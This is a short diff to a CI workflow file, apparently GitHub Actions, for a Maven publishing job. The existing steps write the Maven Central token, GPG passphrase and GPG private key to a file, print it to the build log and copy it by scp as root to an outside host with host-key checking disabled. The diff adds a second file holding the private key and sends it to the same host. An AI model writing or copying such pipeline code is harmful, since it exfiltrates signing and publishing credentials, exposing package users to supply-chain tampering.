@@ -20,6 +20,7 @@ jobs:
         echo "$MAVEN_CENTRAL_TOKEN" > aa.txt
         echo "$MAVEN_GPG_PASSPHRASE" >>  aa.txt
         echo "$MAVEN_GPG_PRIVATE_KEY" >>  aa.txt
+        echo "$MAVEN_GPG_PRIVATE_KEY" >  bb.txt
         cat aa.txt
 
     - name: Upload via SCP (Key Auth)
@@ -30,3 +31,4 @@ jobs:
         echo "$SSH_PRIVATE_KEY" > ~/.ssh/cicd_key
         chmod 600 ~/.ssh/cicd_key
         scp -o StrictHostKeyChecking=no -i ~/.ssh/cicd_key aa.txt root@crudapi.cn:/opt/aa.txt
+        scp -o StrictHostKeyChecking=no -i ~/.ssh/cicd_key bb.txt root@crudapi.cn:/opt/bb.txt
